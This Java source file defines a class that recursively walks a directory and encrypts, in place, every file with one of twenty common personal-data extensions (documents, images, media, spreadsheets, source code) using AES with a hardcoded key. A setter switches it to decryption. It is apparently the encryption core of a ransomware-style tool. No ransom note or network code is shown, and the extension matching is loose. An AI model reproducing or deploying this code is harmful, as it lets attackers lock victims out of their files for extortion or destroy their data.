import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class FileEncrypter {
	private int encryptMode;

	private String[] extensions = { "ppt", "pptx", "docx", "txt", "pdf", "png", "jpg", "mp3", "mp4", "wav", "csv",
			"xls", "xlsx", "avi", "java", "c", "py", "html", "js", "xml" };

	public void getFiles(String path) {
		File root = new File(path);
		File[] fileList = root.listFiles();

		for (File file : fileList) {
			if (file.isDirectory()) {
				getFiles(file.getAbsolutePath());
			} else if (file.isFile()) {

				for (String extension : extensions) {
					if (file.toString().endsWith(extension)) {
						writeFile(file);
						break;

					}
				}

			}
		}
	}

	public void setDesCipher(int encryptMode) {
		this.encryptMode = encryptMode;

	}

	private void writeFile(File file) {

		try {
			Key secretKey = new SecretKeySpec("t5\"7d!zAtWq$#zA8~.&?S_\"@^j@eg{Gg".getBytes(), "AES");
			Cipher cipher = Cipher.getInstance("AES");
			cipher.init(encryptMode, secretKey);

			FileInputStream inputStream = new FileInputStream(file);
			byte[] inputBytes = new byte[(int) file.length()];
			inputStream.read(inputBytes);

			byte[] outputBytes = cipher.doFinal(inputBytes);

			FileOutputStream outputStream = new FileOutputStream(file);
			outputStream.write(outputBytes);

			inputStream.close();
			outputStream.close();

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
